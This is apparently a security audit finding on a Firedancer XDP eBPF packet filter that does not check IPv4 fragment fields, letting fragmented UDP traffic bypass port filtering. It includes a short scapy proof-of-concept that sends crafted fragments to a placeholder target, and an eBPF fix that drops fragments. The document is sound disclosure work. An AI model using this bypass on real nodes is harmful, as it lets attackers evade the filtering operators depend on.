# HIGH: XDP Filter Bypass via IP Fragmentation

**Category**: NET
**Severity**: High
**Component**: XDP eBPF Filter
**Location**: `src/waltz/xdp/fd_xdp1.c:94-121`

## Summary

The XDP eBPF packet filter does not check IPv4 fragmentation flags or fragment offset fields. An attacker can send fragmented UDP packets that bypass XDP port filtering entirely, as non-first fragments lack the UDP header the filter inspects. The kernel reassembles these fragments and delivers the complete packet to the application, circumventing the XDP filter.

## Technical Details

The eBPF program loads the IP protocol field (offset 9) and checks for UDP (17) or GRE (47):

```c
// fd_xdp1.c:114
*(code++) = FD_EBPF( ldxb, r5, r2, 9 );  // ip4_hdr->protocol
*(code++) = FD_EBPF( jeq_imm, r5, 17, LBL_UDP_CHECK ); // if UDP goto check
```

The IPv4 fragment flags and offset (bytes 6-7: MF flag at bit 13, fragment offset at bits 0-12) are **never read or validated**. This means:

1. A first fragment (offset=0, MF=1) contains the UDP header and passes port matching normally
2. Subsequent fragments (offset>0) don't contain a UDP header at the expected position
3. The XDP filter either misinterprets data at the UDP port offset or passes the packet to the kernel via `LBL_PASS`
4. The kernel IP stack reassembles all fragments into a complete UDP datagram

## Proof of Concept

```python
#!/usr/bin/env python3
"""XDP fragmentation bypass PoC - for authorized testing only"""
from scapy.all import *

target_ip = "TARGET_IP"
target_port = 8001  # gossip port

# Craft a fragmented UDP packet
payload = b"A" * 2000  # payload larger than MTU fragment size
pkt = IP(dst=target_ip, flags="MF", frag=0) / UDP(dport=target_port) / payload[:1000]
pkt2 = IP(dst=target_ip, frag=125) / payload[1000:]  # frag offset in 8-byte units

# First fragment passes XDP (has UDP header), second bypasses entirely
send(pkt)
send(pkt2)
```

## Impact

- Complete bypass of XDP port filtering for fragmented traffic
- Attacker can reach kernel network stack with arbitrary UDP payloads
- Enables attacks on services behind the XDP filter
- Combined with gossip flooding, bypasses any future XDP-level rate limiting

## Remediation

Add fragment flag/offset validation to the eBPF program before the protocol check:

```c
// Load flags/fragment offset from IPv4 bytes 6-7
*(code++) = FD_EBPF( ldxh, r5, r2, 6 );           // flags + frag_offset
*(code++) = FD_EBPF( and64_imm, r5, 0x3FFF );     // mask to frag_offset + MF flag
*(code++) = FD_EBPF( jne_imm, r5, 0, LBL_DROP );  // if fragmented, drop
```

Alternatively, pass fragments to kernel but ensure they cannot reach Firedancer's listening sockets.

## References

- `src/waltz/xdp/fd_xdp1.c:94-121` (IPv4 parsing, no fragment check)
- `src/waltz/xdp/fd_xdp1.c:114` (protocol field check without fragment awareness)
- RFC 791 Section 3.1 (IPv4 header format, fragment fields at bytes 6-7)
